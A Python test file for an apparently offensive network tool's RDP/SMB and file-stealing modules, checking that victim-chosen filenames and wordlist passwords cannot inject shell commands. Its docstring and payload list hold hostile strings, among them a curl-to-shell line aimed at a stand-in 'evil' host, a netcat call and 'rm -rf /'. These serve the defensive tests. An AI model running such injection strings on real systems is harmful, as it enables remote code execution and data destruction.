"""No attack module may build a shell command out of data it did not choose.

Four sites interpolated credentials — or, worse, a filename read off the target machine — into a
`shell=True` string. The severe one was `steal_files_rdp.steal_file`: `find_files` walks
`/mnt/shared`, which is the RDP-redirected drive of the machine being attacked, so the *victim*
picks those filenames. A file called `x; curl http://evil/s|sh; #.flag` matched the steal filters
and then ran as root on the Pi. Victim-to-root on the attacking device is the wrong direction for
a tool that is pointed at hostile networks on purpose.

The other three are wordlist-driven rather than remote, but a password containing `;` or `$(...)`
still executed instead of being tried.

These tests assert the property rather than the wording: a payload that would run under a shell
must arrive as one inert argument, and nothing in actions/ may reintroduce `shell=True`.
"""
import re
import sys
from pathlib import Path
from types import SimpleNamespace

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
sys.path.insert(0, str(Path(__file__).resolve().parent))
import _stubs  # noqa: E402
_stubs.install()

ACTIONS = Path(__file__).resolve().parent.parent / "actions"

# Values that a shell would treat as syntax and an argv list treats as text.
PAYLOADS = ["p; touch /tmp/pwned", "p$(id)", "p`id`", "p && rm -rf /", "p | nc evil 1", "p'\"x"]


def test_no_action_module_uses_a_shell():
    """The blanket rule, checked in source. Any future `shell=True` in an attack module is a new
    injection site waiting for input someone else controls."""
    offenders = [p.name for p in ACTIONS.glob("*.py") if "shell=True" in p.read_text(encoding="utf-8")]
    assert offenders == [], f"shell=True reintroduced in: {offenders}"


def _captured_argv(module_name, call):
    """Run `call` with the module's subprocess/Popen replaced by a recorder."""
    import importlib
    mod = importlib.import_module(f"actions.{module_name}")
    seen = {}

    class FakeProc:
        returncode = 1

        def communicate(self, timeout=None):
            return (b"", b"")

    def fake_popen(cmd, *a, **kw):
        seen["cmd"] = cmd
        seen["shell"] = kw.get("shell", False)
        return FakeProc()

    target = "subprocess" if hasattr(mod, "subprocess") else None
    saved = None
    if target:
        saved = mod.subprocess.Popen
        mod.subprocess.Popen = fake_popen
    else:                                   # smb_connector imports Popen by name
        saved = mod.Popen
        mod.Popen = fake_popen
    try:
        call(mod)
    finally:
        if target:
            mod.subprocess.Popen = saved
        else:
            mod.Popen = saved
    return seen


def test_rdp_connector_passes_a_malicious_password_as_one_argument():
    for payload in PAYLOADS:
        seen = _captured_argv("rdp_connector", lambda m: m.RDPConnector.rdp_connect(
            m.RDPConnector.__new__(m.RDPConnector), "10.0.0.5", "root", payload))
        assert isinstance(seen["cmd"], list), "argv list, not a shell string"
        assert seen["shell"] is False
        assert f"/p:{payload}" in seen["cmd"], "the payload must survive intact as ONE argument"


def test_smb_connector_passes_a_malicious_password_as_one_argument():
    for payload in PAYLOADS:
        seen = _captured_argv("smb_connector", lambda m: m.SMBConnector.smbclient_l(
            m.SMBConnector.__new__(m.SMBConnector), "10.0.0.5", "root", payload))
        assert isinstance(seen["cmd"], list)
        assert seen["shell"] is False
        assert f"root%{payload}" in seen["cmd"]


def test_steal_files_rdp_passes_a_malicious_password_as_one_argument():
    for payload in PAYLOADS:
        obj = None

        def call(m):
            nonlocal obj
            obj = m.StealFilesRDP.__new__(m.StealFilesRDP)
            obj.shared_data = SimpleNamespace(orchestrator_should_exit=False)
            obj.rdp_connected = False
            return m.StealFilesRDP.connect_rdp(obj, "10.0.0.5", "root", payload)

        seen = _captured_argv("steal_files_rdp", call)
        assert isinstance(seen["cmd"], list) and seen["shell"] is False
        assert f"/p:{payload}" in seen["cmd"]


def test_stealing_a_maliciously_named_file_copies_it_instead_of_running_it(tmp_path):
    """The severe one. The filename comes from the target's redirected drive, so the victim writes
    it. It must be copied as data — never handed to a shell."""
    import importlib
    mod = importlib.import_module("actions.steal_files_rdp")

    # No absolute path in the payload: tmp_path is a Windows path containing ":", which
    # the filesystem refuses. A relative marker proves the same thing — if a shell ran
    # this name, the marker file would appear in the working directory.
    marker = "PWNED_BY_FILENAME"
    evil_name = f"loot; touch {marker}; #.flag"
    src_dir = tmp_path / "mnt"
    src_dir.mkdir()
    src = src_dir / evil_name
    src.write_text("secret contents")

    obj = mod.StealFilesRDP.__new__(mod.StealFilesRDP)
    obj.shared_data = SimpleNamespace(orchestrator_should_exit=False)
    mod.StealFilesRDP.steal_file(obj, str(src), str(tmp_path / "out"))

    assert not (tmp_path / marker).exists(), "the filename was executed — injection is back"
    assert not Path(marker).exists(), "the filename was executed — injection is back"
    copied = tmp_path / "out" / evil_name
    assert copied.exists() and copied.read_text() == "secret contents", "the file must still be stolen"


def test_the_steal_filters_would_actually_match_such_a_name():
    """Guards the premise: if no plausible payload could pass the extension/name filters, the
    finding would be theoretical. `.flag` is a default steal extension."""
    src = (ACTIONS / "steal_files_rdp.py").read_text(encoding="utf-8")
    assert "steal_file_extensions" in src and "endswith" in src
    evil = "loot; touch /tmp/PWNED #.flag"
    assert any(evil.endswith(ext) for ext in [".bjorn", ".hack", ".flag"])


if __name__ == "__main__":
    import inspect
    for name, fn in sorted(globals().items()):
        if name.startswith("test_") and callable(fn) and not inspect.signature(fn).parameters:
            fn()
    print("ok (fixture-free subset; run pytest for all)")
